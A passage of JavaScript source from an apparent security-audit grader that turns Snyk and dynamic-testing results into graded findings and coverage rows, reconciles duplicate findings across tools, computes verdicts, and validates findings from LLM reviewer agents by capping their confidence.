  // GRADE OR DECLARE, applied to a tool that may never have run. Dynamic testing is the resolver
  // for the static tier's `undeterminable` worklist — a route nobody could settle from source gets
  // settled by an unauthenticated request. So when it does NOT run, the honest output is not
  // silence and it is certainly not a pass: it is a row saying which tool was refused or missing
  // and why, sitting in the same table as everything else, so a reader can tell "we probed and it
  // held" from "we never probed".
  //
  // Every refusal is its own row. A single "the gate blocked some things" line would hide the one
  // that matters — a target the operator believed was in scope and is not.
  const dyn = scanners.dynamic
  if (dyn) {
    if (dyn.enabled !== true) {
      ledger.record('scanCoverage', 'scan:dynamic', 'undeterminable',
        'dynamic testing is off (dynamic_testing.enabled is not true in claudeguard.scope.yml), so nothing was probed against the running system and every route the static tier could not settle is still unsettled')
    } else if (dyn.available !== true) {
      ledger.record('scanCoverage', 'scan:dynamic', 'undeterminable',
        `dynamic testing is enabled but the tooling was not reachable (${dyn.unavailableReason || 'no reason given'}) — the gate held, and nothing ran`)
    } else if (dyn.dryRun === true) {
      ledger.record('scanCoverage', 'scan:dynamic', 'undeterminable',
        `dry_run is true, so the gate produced a plan of ${(dyn.decisions || []).length} action(s) and sent nothing — set dynamic_testing.execution.dry_run: false to actually probe`)
    } else {
      const executed = (dyn.decisions || []).filter(d => d.allowed).length
      ledger.record('scanCoverage', 'scan:dynamic', 'pass',
        `${executed} gated action(s) ran against the allowlisted target(s) at tier ${dyn.tier || 'unknown'}`)
    }

    // One row per refusal. Two identical refusals are one row — the ledger answers a duplicate
    // subject with a throw, and a repeated refusal is the same coverage fact, not a new one.
    const seenRefusals = new Set()
    for (const d of dyn.decisions || []) {
      if (d.allowed) continue
      const subject = `scan:dynamic:${d.tool || 'unnamed-tool'}:${d.target || 'unnamed-target'}`
      if (seenRefusals.has(subject)) continue
      seenRefusals.add(subject)
      ledger.record('scanCoverage', subject, 'undeterminable',
        `the dynamic-testing gate refused ${d.tool || 'a tool'} against ${d.target || 'an unnamed target'}: ` +
        ((d.reasons || []).join('; ') || 'no reason recorded'))
    }
  }

  // ---- Snyk ----
  gradeSnyk(scanners.snyk, ledger, findings, allow)
}

// ---------------------------------------------------------------------------
// Snyk — a commercial scanner, held to the same model as every other input
//
// Snyk is not a new axis; it is a stronger member of the family already integrated here. What
// makes it worth more than "another scanner" is two facts a regex cannot produce, and both of them
// buy CONFIDENCE rather than volume:
//
//   * SCA REACHABILITY. run_dep_audit has to cap every dependency CVE at `needs-review` because it
//     cannot tell whether the vulnerable function is ever called (FP-16). Snyk can. `reachable` is
//     a direct, single-hop observation of a call path — `strong` evidence, so `likely`.
//     `not-reachable` is not a finding at all: it becomes a coverage row saying "present but
//     unreached", which is how the unreachable-CVE false positive gets deleted with DATA instead of
//     a caveat. `unknown` stays exactly where it is today, `weak` → `needs-review`.
//
//   * SNYK CODE DATAFLOW. A SAST hit that carries a proven source→sink path is a direct
//     observation; the same rule matching with no path is a lead. So `hasDataflow: true` earns
//     `strong` and `likely`, and everything else stays `needs-review`.
//
// THE CEILING. No Snyk finding may ever be `confirmed`, and it is asserted in grade() rather than
// merely intended. `confirmed` drives the headline verdict and the auto-fix gate, and Snyk's
// answer is an external tool's judgement — only our own deterministic rules (which read the file
// themselves) or a live proof-of-concept may reach it. This audience cannot tell a false P0 from a
// real one; a wrong one makes people rotate live keys and announce a breach that never happened.
// ---------------------------------------------------------------------------

/**
 * Snyk's severities are its OPINION, re-mapped and re-graded — the same discipline semgrep gets.
 * This is the starting point the methodology names; SNYK_KIND's `ceiling` is the "grader may
 * override by rule" half, and it exists so the SAME weakness does not grade differently depending
 * on which tool happened to find it.
 */
const SNYK_ADVISORY_SEVERITY = { critical: 'P0', high: 'P1', medium: 'P2', low: 'P3' }

const SNYK_KIND = {
  'dep-vuln': {
    id: 'CG-SNYK-001',
    // Deliberately the same ceiling as DEP_SEVERITY. One critical upstream advisory graded P1 by
    // npm-audit and P0 by Snyk would mean the badge depends on which tool the user installed.
    ceiling: 'P1',
    title_en: v => `Vulnerable dependency: ${v}`,
    title_he: v => `תלות פגיעה: ${v}`,
    exploit: 'An attacker exercises the vulnerable code path in this package.',
    impact: 'Depends on the advisory. Snyk reports whether your code reaches the vulnerable function; that is what separates a real risk from upstream noise.',
    guard: 'guard-recipes/dependency-hygiene.md', cwe: 'CWE-1104', owasp: 'A06:2021',
  },
  'container-vuln': {
    id: 'CG-SNYK-007', ceiling: 'P1',
    title_en: v => `Vulnerable package in the container image: ${v}`,
    title_he: v => `חבילה פגיעה באימג' הקונטיינר: ${v}`,
    exploit: 'An attacker who reaches the running container exercises the vulnerable package.',
    impact: 'Depends on the advisory and on whether the package is used at runtime rather than only present in the image.',
    guard: 'guard-recipes/container-iac.md#pin-base-images', cwe: 'CWE-1104', owasp: 'A06:2021',
  },
  'sast-sqli': {
    // Matches CG-DAST-SQLI. The same weakness, graded the same, whoever found it.
    id: 'CG-SNYK-002', ceiling: 'P1',
    title_en: () => 'User input may reach an SQL query unparameterised',
    title_he: () => 'ייתכן שקלט משתמש מגיע לשאילתת SQL ללא פרמטרים',
    exploit: 'An attacker rewrites the query through the input, reading or changing anything the database user can reach.',
    impact: 'Read or modify any data the application\'s database user can touch.',
    guard: 'guard-recipes/zod-validation.md#parameterised-queries', cwe: 'CWE-89', owasp: 'A03:2021',
  },
  'sast-xss': {
    id: 'CG-SNYK-003', ceiling: 'P1',
    title_en: () => 'User input may reach the page without escaping',
    title_he: () => 'ייתכן שקלט משתמש מגיע לדף ללא בריחה',
    exploit: 'An attacker sends a victim a link containing script that runs on your origin.',
    impact: 'Session theft and actions performed as the victim.',
    guard: 'guard-recipes/zod-validation.md#output-encoding', cwe: 'CWE-79', owasp: 'A03:2021',
  },
  'sast-ssrf': {
    id: 'CG-SNYK-004', ceiling: 'P1',
    title_en: () => 'User input may choose the address your server requests',
    title_he: () => 'ייתכן שקלט משתמש קובע לאיזו כתובת השרת פונה',
    exploit: 'An attacker points the request at your cloud metadata service or an internal host and reads the response.',
    impact: 'Internal services and cloud credentials become reachable from the open internet.',
    guard: 'guard-recipes/zod-validation.md', cwe: 'CWE-918', owasp: 'A10:2021',
  },
  'sast-path-traversal': {
    id: 'CG-SNYK-005', ceiling: 'P1',
    title_en: () => 'User input may choose which file is read or written',
    title_he: () => 'ייתכן שקלט משתמש קובע איזה קובץ נקרא או נכתב',
    exploit: 'An attacker walks out of the intended directory with ../ and reads a file you never meant to serve.',
    impact: 'Disclosure of configuration, credentials, or other users\' uploads.',
    guard: 'guard-recipes/zod-validation.md', cwe: 'CWE-22', owasp: 'A01:2021',
  },
  'sast-other': {
    id: 'CG-SNYK-008', ceiling: 'P2',
    title_en: r => `Snyk Code: ${r}`,
    title_he: r => `ממצא Snyk Code: ${r}`,
    exploit: 'See the rule\'s own description; Snyk Code matched a pattern it associates with this weakness.',
    impact: 'Varies by rule. Treat as a lead for a reviewer, not a proven finding.',
    guard: 'guard-recipes/zod-validation.md', cwe: null, owasp: null,
  },
  'iac-misconfig': {
    // Uncapped on purpose: a public bucket or an 0.0.0.0/0 rule on a database port really is total
    // exposure, and severity is impact-if-true. The uncertainty is paid in confidence, which never
    // exceeds `needs-review` here because we did not parse the file ourselves.
    id: 'CG-SNYK-006', ceiling: null,
    title_en: t => `Infrastructure misconfiguration: ${t}`,
    title_he: t => `הגדרת תשתית שגויה: ${t}`,
    exploit: 'An attacker uses the misconfigured resource directly — an open port, a public bucket, an over-privileged container.',
    impact: 'Depends on the resource. Infrastructure mistakes tend to expose everything behind them at once.',
    guard: 'guard-recipes/container-iac.md', cwe: null, owasp: 'A05:2021',
  },
}

/** Never above the ceiling for this weakness class. Severity is capped by DOMAIN, never by doubt. */
function snykSeverity(kind, advisory) {
  const base = SNYK_ADVISORY_SEVERITY[String(advisory || '').toLowerCase()] || 'P3'
  const ceiling = SNYK_KIND[kind]?.ceiling
  if (!ceiling) return base
  return SEVERITY_ORDER.indexOf(base) < SEVERITY_ORDER.indexOf(ceiling) ? ceiling : base
}

/**
 * The confidence win, written as an evidence decision — because confidence is a pure function of
 * evidence and nothing here may write a confidence directly.
 *
 * `strong` and `weak` are the only two values this can return. `definitive` would mean `confirmed`,
 * and an external tool never earns that.
 */
function snykEvidence(o) {
  if (o.kind === 'dep-vuln' && o.reachability === 'reachable') return 'strong'
  if (String(o.kind).startsWith('sast-') && o.hasDataflow === true) return 'strong'
  return 'weak'
}

const SNYK_SCANS = {
  sca: 'the Snyk dependency (SCA) scan',
  code: 'the Snyk Code (SAST) scan',
  iac: 'the Snyk infrastructure-as-code scan',
  container: 'the Snyk container image scan',
}

function gradeSnyk(snyk, ledger, findings, allow) {
  if (!snyk) return
  ledger.declare('scanCoverage')
  ledger.declare('snyk')

  // GRADE OR DECLARE. Each of the four scans gets a row whether it ran or not, because a reader
  // cannot tell silence apart from safety. "Snyk is not installed", "there is no token", "the
  // folder is not trusted" and — the one that matters most for this audience — "Snyk Code was
  // skipped because you did not consent to uploading your source" are all coverage facts.
  for (const [name, label] of Object.entries(SNYK_SCANS)) {
    const subject = `scan:snyk-${name}`
    const s = snyk.scans?.[name]
    if (!s) {
      ledger.record('scanCoverage', subject, 'undeterminable',
        `${label} was not attempted and the adapter said nothing about why`)
      continue
    }
    if (!s.ran || s.observations == null) {
      ledger.record('scanCoverage', subject, 'undeterminable', s.reason || `${label} did not run`)
      continue
    }
    // A multi-target run can succeed and still have skipped members — recorded: Snyk IaC answers
    // every GitHub Actions workflow with a per-file parse error (its parser does not cover them;
    // this grader's own CG-CI rules do). The scan is a pass, and the limit is written on the row,
    // because a partial scan that prints an unqualified checkmark is overstating its own coverage.
    const skipped = s.skippedTargets || []
    ledger.record('scanCoverage', subject, 'pass',
      `${label} ran and returned ${s.observations.length} result(s)` +
      (skipped.length
        ? `; ${skipped.length} file(s) Snyk could not parse were skipped (${skipped[0].error}) — files of that kind are graded by this tool's own rules, not by Snyk`
        : ''))
  }

  const all = Object.values(snyk.scans || {}).flatMap(s => (s && s.ran ? s.observations || [] : []))
  const seen = new Set()
  for (const o of all) {
    if (!o || !o.subject) continue
    const subject = String(o.subject)
    // Snyk lists one row per (issue, dependency path), so one package with several advisories — and
    // one advisory reached by several paths — are both normal input. LAW 2 answers a repeated
    // subject with a throw, which would crash the whole report rather than print it.
    if (seen.has(subject)) continue
    seen.add(subject)
    if (allow.has(subject)) { ledger.record('snyk', subject, 'allowlisted', 'user allowlist'); continue }

    const p = SNYK_KIND[o.kind]
    if (!p) {
      // A result class no rule owns is DECLARED, never dropped. Adding a Snyk tool without a policy
      // entry would otherwise widen the blind spot silently — the exact defect grade-or-declare
      // exists to prevent.
      ledger.record('snyk', subject, 'undeterminable',
        `no rule owns Snyk result kind "${o.kind}" — open ${o.at?.file || 'the reported location'} and review it by hand`)
      continue
    }

    // THE REACHABILITY WIN, honest half. Snyk followed the call graph and found no path from this
    // application into the vulnerable function, so this is not a finding — it is a coverage row
    // saying the package is present but unreached. Shipping it as a P0 anyway is FP-16, and burying
    // two real findings under a wall of upstream advisories is how a report stops being read.
    if (o.reachability === 'not-reachable') {
      ledger.record('snyk', subject, 'pass',
        `${o.title || subject} is present, but Snyk's reachability analysis found no path from your code into the vulnerable function ` +
        '(a dynamic require or reflection could still reach it, so this is a pass with a named limit, not a guarantee)')
      continue
    }

    const evidence = snykEvidence(o)
    const label = o.title || o.ruleId || o.kind
    findings.push(finding({
      id: p.id, subject,
      title_en: p.title_en(label), title_he: p.title_he(label),
      severity: snykSeverity(o.kind, o.advisorySeverity),
      evidence,
      why: `${o.detail || label} Snyk rates it ${o.advisorySeverity}. ` + (
        o.kind === 'dep-vuln'
          ? o.reachability === 'reachable'
            ? 'Snyk traced a call path from your code into the vulnerable function, so this advisory is about code this app actually runs.'
            : 'Snyk could not establish whether your code reaches the vulnerable function, so this may be an advisory about code the app never calls.'
          : String(o.kind).startsWith('sast-')
            ? o.hasDataflow
              ? 'Snyk Code traced a source→sink path for this, rather than only matching a pattern.'
              : 'Snyk Code matched this rule without proving a source→sink path, so it is a lead rather than a traced flow.'
            : 'Reported by an external scanner reading the file, so it is never auto-confirmed.'),
      at: firstAt(o.at?.file || null, o.at?.line ?? null),
      exploit: p.exploit, impact: p.impact, guard: p.guard,
      cwe: o.cwe || p.cwe || null, owasp: p.owasp || null,
      tier: 'static', autofixable: false, source: 'snyk',
      assumption: o.kind === 'dep-vuln' && o.reachability !== 'reachable'
        ? 'That the vulnerable code path is actually reached at runtime. Snyk could not establish it either way here.'
        : String(o.kind).startsWith('sast-') && !o.hasDataflow
          ? 'That the rule matched real behaviour and not a shape that only looks like it — Snyk proved no path from an input to this line.'
          : 'That Snyk\'s analysis is right about this file. It is a commercial tool\'s judgement, not something this grader read for itself.',
    }))
    ledger.record('snyk', subject, 'fail',
      `${o.kind} (${o.advisorySeverity}` +
      (o.reachability && o.reachability !== 'unknown' ? `, ${o.reachability}` : '') +
      (o.hasDataflow ? ', dataflow proven' : '') + ')')
  }
}

// ---------------------------------------------------------------------------
// Reconciliation — three tools, one defect
//
// Snyk's findings overlap semgrep's, and both overlap rules this grader already owns. Printed
// straight through, a single missing USER directive in one Dockerfile arrives three times with
// three severities, and the reader has no way to tell that from three separate problems. Volume is
// what destroys trust — not any single finding — so reconciliation is mandatory, not cosmetic.
//
// The join key is the WEAKNESS CLASS at a file:line, not the location alone. Two genuinely
// different defects can share a line, and collapsing those would hide one — a false negative, which
// is worse than a visible duplicate. So anything we cannot classify is never merged.
//
// Two rules keep this from losing information:
//
//   1. Only ACROSS sources. Two findings from the same producer at one line are that producer's
//      business: it enumerated them deliberately (a compose file can mount the Docker socket AND
//      run privileged). Reconciliation is about the same fact seen twice, not about tidying up.
//   2. A native rule outranks any external tool. This grader is the single severity authority, and
//      its own rules read the file directly; a commercial scanner's opinion about the same
//      file:line does not override a grade we derived ourselves. Among external tools, the
//      strongest evidence wins.
//
// The absorbed findings are not deleted, they are recorded on the survivor as `corroboration`,
// carrying their own severity — so "semgrep and Snyk independently agreed" is visible, and a
// higher severity claimed by a tool we did not follow is still legible in the report.
// ---------------------------------------------------------------------------

/** CWE is a stable, cross-tool vocabulary; it is the first thing we try. */
const WEAKNESS_BY_CWE = {
  'CWE-89': 'sqli', 'CWE-564': 'sqli',
  'CWE-79': 'xss', 'CWE-80': 'xss',
  'CWE-918': 'ssrf',
  'CWE-22': 'path-traversal', 'CWE-23': 'path-traversal', 'CWE-36': 'path-traversal', 'CWE-73': 'path-traversal',
  'CWE-78': 'command-injection',
  'CWE-94': 'code-injection',
  'CWE-798': 'hardcoded-secret',
  'CWE-250': 'excess-privilege',
  'CWE-1104': 'vulnerable-dependency',
  'CWE-284': 'broken-access-control',
  'CWE-319': 'cleartext-transport',
  'CWE-352': 'csrf',
  'CWE-601': 'open-redirect',
  'CWE-668': 'exposed-resource',
}

/**
 * Fallback for tools that report a rule id and no CWE — semgrep, in this codebase. Only consulted
 * when there is no CWE, and only ever matched against a finding at the SAME file:line, which is
 * what keeps a keyword this loose from merging unrelated things.
 */
const WEAKNESS_BY_TEXT = [
  [/\bsqli\b|sql[-_. ]?injection/, 'sqli'],
  [/\bxss\b|cross[-_. ]?site[-_. ]?script/, 'xss'],
  [/\bssrf\b|server[-_. ]?side[-_. ]?request/, 'ssrf'],
  [/path[-_. ]?traversal|zip[-_. ]?slip|directory[-_. ]?traversal/, 'path-traversal'],
  [/command[-_. ]?injection|os[-_. ]?command|shell[-_. ]?injection/, 'command-injection'],
  [/code[-_. ]?injection|unsafe[-_. ]?eval/, 'code-injection'],
  [/hard[-_. ]?coded|baked[-_. ]?(in|secret)|secrets?[-_. ]?in[-_. ]/, 'hardcoded-secret'],
  [/non[-_. ]?root|missing[-_. ]?user|runs?[-_. ]?as[-_. ]?root|root[-_. ]?user|privileged/, 'excess-privilege'],
  [/open[-_. ]?redirect/, 'open-redirect'],
]

/** @returns a weakness-class string, or null when we cannot name it — null is never merged. */
function weaknessOf(f) {
  const byCwe = WEAKNESS_BY_CWE[String(f.cwe || '').toUpperCase()]
  if (byCwe) return byCwe
  const text = `${f.subject} ${f.title_en} ${f.evidence?.why ?? ''}`.toLowerCase()
  for (const [re, klass] of WEAKNESS_BY_TEXT) if (re.test(text)) return klass
  return null
}

const EVIDENCE_RANK = { definitive: 0, strong: 1, judgement: 2, weak: 3 }

/** Total order, so two runs of the same repo reconcile identically. */
function strongerFinding(a, b) {
  return (EVIDENCE_RANK[a.evidence.strength] - EVIDENCE_RANK[b.evidence.strength]) ||
    (SEVERITY_ORDER.indexOf(a.severity) - SEVERITY_ORDER.indexOf(b.severity)) ||
    String(a.id).localeCompare(String(b.id)) ||
    String(a.subject).localeCompare(String(b.subject))
}

/**
 * @param {object[]} findings
 * @param {Ledger} ledger  absorbed subjects get their coverage note rewritten to point at the
 *                         survivor, so the "every fail row has a finding" cross-check still holds.
 * @returns {object[]} the surviving findings
 */
function reconcileDuplicates(findings, ledger) {
  const groups = new Map()
  for (const f of findings) {
    const at = f.evidence?.at?.[0]
    if (!at?.file || at.line == null) continue // no location, nothing to reconcile against
    const weakness = weaknessOf(f)
    if (!weakness) continue
    const key = `${at.file}:${at.line}:${weakness}`
    if (!groups.has(key)) groups.set(key, [])
    groups.get(key).push(f)
  }

  const absorbed = new Set()
  for (const group of groups.values()) {
    const bySource = new Map()
    for (const f of group) {
      const src = f.source || null
      if (!bySource.has(src)) bySource.set(src, [])
      bySource.get(src).push(f)
    }
    if (bySource.size < 2) continue // one tool's own enumeration — leave it alone

    // Which SOURCE owns this defect. A native rule (source null) always does.
    const sources = [...bySource.keys()].sort((a, b) => {
      if ((a === null) !== (b === null)) return a === null ? -1 : 1
      const bestA = bySource.get(a).slice().sort(strongerFinding)[0]
      const bestB = bySource.get(b).slice().sort(strongerFinding)[0]
      return strongerFinding(bestA, bestB) || String(a).localeCompare(String(b))
    })
    const winnerSource = sources[0]
    // Findings from the winning source all survive; the best of them collects the corroboration.
    const winner = bySource.get(winnerSource).slice().sort(strongerFinding)[0]

    for (const src of sources.slice(1)) {
      for (const f of bySource.get(src).slice().sort(strongerFinding)) {
        absorbed.add(f)
        winner.corroboration.push({
          source: src, id: f.id, subject: f.subject,
          severity: f.severity, confidence: f.confidence,
          // Carried verbatim so a higher severity another tool claimed is still readable, rather
          // than being silently replaced by the survivor's.
          why: f.evidence?.why ?? f.title_en,
        })
        ledger.annotate(f.subject,
          `reconciled into ${winner.id} (${winner.subject}) — the same weakness at the same location, reported by more than one tool`)
      }
    }
  }
  return findings.filter(f => !absorbed.has(f))
}

// ---------------------------------------------------------------------------
// Shared summary — verdict + counts. Used by grade() and by the reviewer merge, so the verdict
// rule ("count only confirmed") is written in exactly one place.
// ---------------------------------------------------------------------------

/** Report ordering: severity first, then confidence, so the thing to fix now is at the top. */
function sortFindings(findings) {
  return findings.slice().sort((a, b) =>
    SEVERITY_ORDER.indexOf(a.severity) - SEVERITY_ORDER.indexOf(b.severity) ||
    CONFIDENCE_ORDER.indexOf(a.confidence) - CONFIDENCE_ORDER.indexOf(b.confidence) ||
    String(a.id).localeCompare(String(b.id)))
}

function summarize(findings, discovery = null) {
  const confirmed = findings.filter(f => f.confidence === 'confirmed')
  // Unproven catastrophe: impact-if-true is P0/P1, but the evidence never reached `confirmed`.
  // These are exactly the findings the old verdict discarded — and the reason a repo with an open
  // unauthenticated DELETE could print green.
  const unproven = findings.filter(f =>
    f.confidence !== 'confirmed' && (f.severity === 'P0' || f.severity === 'P1'))
  const discoveryCoverage = assessDiscoveryCoverage(discovery)

  // The level the CONFIRMED findings alone produce. `null` when nothing was confirmed. This is the
  // axis reviewer findings may never move (see mergeReviewerFindings), and it is unchanged by LAW 4.
  const confirmedLevel = confirmed.some(f => f.severity === 'P0') ? 'critical'
    : confirmed.some(f => f.severity === 'P1') ? 'high'
      : confirmed.some(f => f.severity === 'P2') ? 'medium'
        : confirmed.length ? 'low' : null

  // LAW 4. With nothing confirmed the badge is no longer automatically green: an open unproven
  // P0/P1, or discovery below the floor, means we did not prove it safe — and `unknown` says so.
  const level = confirmedLevel ??
    ((unproven.length || !discoveryCoverage.adequate) ? 'unknown' : 'clean')

  return {
    verdict: {
      rule: 'critical/high/medium/low count ONLY findings whose confidence is `confirmed`; ' +
        '`clean` additionally requires zero unproven P0/P1 and discovery coverage at or above the ' +
        'floor — otherwise the level is `unknown` ("not proven safe"), never `clean`',
      level,
      confirmedLevel,
      confirmedP0: confirmed.filter(f => f.severity === 'P0').length,
      confirmedP1: confirmed.filter(f => f.severity === 'P1').length,
      // Printed beside the badge, because these are what an `unknown` is made of.
      unprovenP0: unproven.filter(f => f.severity === 'P0').length,
      unprovenP1: unproven.filter(f => f.severity === 'P1').length,
      discoveryCoverage,
      needsReview: findings.filter(f => f.confidence === 'needs-review').length,
      likely: findings.filter(f => f.confidence === 'likely').length,
    },
    counts: {
      total: findings.length,
      bySeverity: Object.fromEntries(SEVERITY_ORDER.map(s => [s, findings.filter(f => f.severity === s).length])),
      byConfidence: Object.fromEntries(CONFIDENCE_ORDER.map(c => [c, findings.filter(f => f.confidence === c).length])),
    },
  }
}

// ---------------------------------------------------------------------------
// Decision rate — the counter-pressure against a cheap `undeterminable`.
//
// LAW 1 makes `undeterminable` the honest answer whenever a token is all we have, and that is
// right. But it is also the cheapest exit in the architecture: a rule that abstains on everything
// satisfies LAW 2, prints a full coverage table, and decides nothing. Nothing in the ledger
// distinguishes "we looked hard and could not settle it" from "we never tried".
//
// So the fraction of enumerated subjects actually DECIDED — `(pass + fail) / enumerated` — is
// published per subject set and overall, and the benchmark gates on it never decreasing. Note
// `allowlisted` is reported but not counted as decided: the user decided it, we did not.
// ---------------------------------------------------------------------------

function decisionRateOf(coverage) {
  const bySet = {}
  let enumerated = 0
  let decided = 0
  let abstained = 0
  let allowlisted = 0
  for (const [setName, set] of Object.entries(coverage || {})) {
    const c = set.counts
    const d = c.pass + c.fail
    bySet[setName] = {
      enumerated: set.enumerated,
      decided: d,
      abstained: c.undeterminable,
      allowlisted: c.allowlisted,
      rate: set.enumerated ? d / set.enumerated : null,
    }
    enumerated += set.enumerated
    decided += d
    abstained += c.undeterminable
    allowlisted += c.allowlisted
  }
  return {
    rule: '(pass + fail) / enumerated — the share of enumerated subjects the grader actually ' +
      'decided, as opposed to abstaining via `undeterminable`',
    overall: { enumerated, decided, abstained, allowlisted, rate: enumerated ? decided / enumerated : null },
    bySet,
  }
}

// ---------------------------------------------------------------------------
// Run record — a reproducible attestation of WHAT WAS RUN.
//
// It is not a certificate of safety and must never be rendered as one: it says which tool version,
// which commit and which model produced this verdict, so two people can tell whether they are
// looking at the same run before they argue about the finding.
//
// Determinism is the whole point. Nothing in here may vary between two runs on the same model —
// which is why `generatedAt` is null unless the CALLER supplies a clock (`opts.now`). A grader that
// reaches for Date.now() cannot be diffed against itself, and "re-run after the fix and trust the
// diff" is the only workflow this tool offers.
// ---------------------------------------------------------------------------

const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')

/** JSON with every object key sorted, so two structurally equal models hash identically. */
function canonicalJson(value) {
  if (value === null || typeof value !== 'object') return JSON.stringify(value) ?? 'null'
  if (Array.isArray(value)) return '[' + value.map(canonicalJson).join(',') + ']'
  return '{' + Object.keys(value).sort()
    .map(k => JSON.stringify(k) + ':' + canonicalJson(value[k])).join(',') + '}'
}

/** Memoised: identical for every grade() in one process, and one `git` spawn instead of N. */
let _toolVersion
function toolVersion() {
  if (_toolVersion === undefined) {
    try { _toolVersion = JSON.parse(readFileSync(join(REPO_ROOT, 'package.json'), 'utf8')).version ?? null }
    catch { _toolVersion = null }
  }
  return _toolVersion
}

let _commit
function toolCommit() {
  if (_commit === undefined) {
    try {
      const out = execFileSync('git', ['rev-parse', 'HEAD'], {
        cwd: REPO_ROOT, encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'],
      }).trim()
      _commit = /^[0-9a-f]{40}$/.test(out) ? out : null
    } catch { _commit = null }   // no git, no repo, shallow export — a null is honest, a throw is not
  }
  return _commit
}

function buildRunRecord(model, summary, opts) {
  return {
    note: 'Attests WHAT WAS RUN — tool version, commit, model identity, verdict. It is not a ' +
      'statement that this repository is secure.',
    toolVersion: toolVersion(),
    commit: toolCommit(),
    // ONLY when the caller supplies one. The grader never reads a clock; see above.
    generatedAt: opts.now ?? null,
    modelHash: 'sha256:' + createHash('sha256').update(canonicalJson(model)).digest('hex'),
    // Both ledgers add up: LAW 2 (asserted by Ledger.toJSON, which throws otherwise) and the
    // engine's discovery ledger. A false here means the numbers below describe an incomplete read.
    ledgerReconciles: model?.discovery?.reconciles === true,
    confirmedP0: summary.verdict.confirmedP0,
    confirmedP1: summary.verdict.confirmedP1,
    verdict: summary.verdict.level,
  }
}

// ---------------------------------------------------------------------------
// Reviewer findings — the validator for agent output
//
// The grader's own findings are proven safe by the assertions in grade(). But the domain auditors
// (web-auditor, ai-auditor, …) are LLMs, and their findings go into the SAME report. Nothing
// stopped an agent from emitting a `confirmed` P0 on a route that does not exist, turning the badge
// red with no rule behind it. This function is the gate every reviewer finding must pass, and it
// enforces the same laws on agent output that grade() enforces on its own:
//
//   - Provenance is set by the CHANNEL, not the payload: everything here becomes `reviewer`.
//   - A reviewer's evidence is `judgement`, full stop. No amount of reading is a proof, so a
//     reviewer finding is capped at confidence `likely` and can NEVER be `confirmed`. If an agent
//     claims stronger evidence, that is a signal the fact belongs in an engine rule; we keep the
//     finding but cap it, and record the correction.
//   - Confidence is derived, never authored (same mapping as everything else).
//   - LAW 3 still holds: no name-only P0.
//   - A finding must be about something that was actually enumerated. A subject the grader never
//     saw is either a hallucination or an enumeration gap; either way it is flagged, not trusted.
//
// The keystone guarantee, asserted at the end: merging reviewer findings can NEVER change the
// verdict level, because the verdict counts only `confirmed` and a reviewer finding can never be
// confirmed. That is what makes it safe to let an LLM contribute to the report at all.
// ---------------------------------------------------------------------------

const REQUIRED_REVIEWER_FIELDS = ['subject', 'title_en', 'title_he', 'severity', 'exploit', 'impact']

/**
 * @param {object} graded            the return value of grade()
 * @param {object[]} reviewerFindings raw findings authored by the auditor subagents
 * @returns {object} graded, with valid reviewer findings merged in, plus `rejected` and
 *                   `reviewerNotes` explaining every drop and every correction.
 */
export function mergeReviewerFindings(graded, reviewerFindings = []) {
  const accepted = []
  const rejected = []
  const notes = []

  // Every subject the grader enumerated, across all sets and dispositions. A reviewer finding must
  // anchor to one of these; anything else is unanchored.
  const enumerated = new Set()
  const undeterminable = new Set()
  for (const [, set] of Object.entries(graded.coverage || {})) {
    for (const disp of DISPOSITIONS) {
      for (const s of set[disp] || []) {
        enumerated.add(s.subject)
        if (disp === 'undeterminable') undeterminable.add(s.subject)
      }
    }
  }

  let auto = 0
  for (const raw of reviewerFindings || []) {
    const where = raw && (raw.id || raw.subject || `#${auto}`)

    // Structural validation first — a finding missing its evidence or its impact is not a finding.
    const missing = REQUIRED_REVIEWER_FIELDS.filter(k => raw?.[k] == null || raw[k] === '')
    if (!raw || missing.length) {
      rejected.push({ finding: raw, reason: `missing required field(s): ${missing.join(', ') || 'not an object'}` })
      continue
    }
    if (!SEVERITY_ORDER.includes(raw.severity)) {
      rejected.push({ finding: raw, reason: `invalid severity "${raw.severity}"` })
      continue
    }

    // Accept both the flat shape ({why, at}) and the already-nested one ({evidence:{why,at}}).
    const why = raw.why ?? raw.evidence?.why ?? 'A reviewer judged this from reading the code.'
    const at = raw.at ?? raw.evidence?.at ?? []
    const nameOnly = !!(raw.nameOnly ?? raw.evidence?.nameOnly)

    // LAW 3, applied before the cap so the message is precise.
    if (nameOnly && raw.severity === 'P0') {
      rejected.push({ finding: raw, reason: 'LAW 3: a P0 may not rest on name-only evidence' })
      continue
    }

    // The cap. A reviewer's evidence is judgement, whatever they claimed.
    const claimed = raw.evidence?.strength ?? raw.evidence ?? null
    if (claimed && claimed !== 'judgement') {
      notes.push(`${where}: evidence "${claimed}" capped to "judgement" — if it is provable, add an engine rule instead of a reviewer finding`)
    }
    if (raw.confidence && raw.confidence !== 'likely') {
      notes.push(`${where}: confidence "${raw.confidence}" ignored — confidence is derived, and a reviewer finding is always "likely"`)
    }

    let built
    try {
      // Reuse the same builder the rules use: it derives confidence, re-checks LAW 3, and validates
      // the enums. Provenance and evidence are forced here, so the payload cannot lie about them.
      built = finding({
        id: raw.id || `CG-REVIEW-${String(++auto).padStart(3, '0')}`,
        subject: raw.subject,
        title_en: raw.title_en, title_he: raw.title_he,
        severity: raw.severity,
        evidence: 'judgement',
        provenance: 'reviewer',
        nameOnly,
        why, at,
        exploit: raw.exploit, impact: raw.impact,
        guard: raw.guard ?? null, cwe: raw.cwe ?? null, owasp: raw.owasp ?? null,
        autofixable: false, // a reviewer finding is never eligible for auto-fix
        tier: raw.tier || 'static',
        assumption: raw.assumption ?? null,
      })
    } catch (e) {
      rejected.push({ finding: raw, reason: String(e.message || e) })
      continue
    }

    // Defence in depth: the cap must have produced `likely`. If not, something is very wrong.
    if (built.confidence === 'confirmed') {
      rejected.push({ finding: raw, reason: 'a reviewer finding resolved to confirmed — impossible, dropping it' })
      continue
    }

    // Anchoring. Not fatal, but a reviewer finding about a subject the grader never enumerated is
    // either a hallucination or proof the engine missed something. Flag it loudly either way.
    if (!enumerated.has(built.subject)) {
      built.unanchored = true
      notes.push(`${built.id}: subject "${built.subject}" was never enumerated by the engine — treat as a possible hallucination or an enumeration gap, not a settled finding`)
    } else if (!undeterminable.has(built.subject)) {
      // Commenting on a pass/fail subject is allowed (business logic a rule's verdict doesn't
      // cover), but worth a note so a contradiction with a confirmed finding is visible.
      built.offWorkList = true
    }

    accepted.push(built)
  }

  const merged = sortFindings([...(graded.findings || []), ...accepted])
  const summary = summarize(merged, graded.discovery)

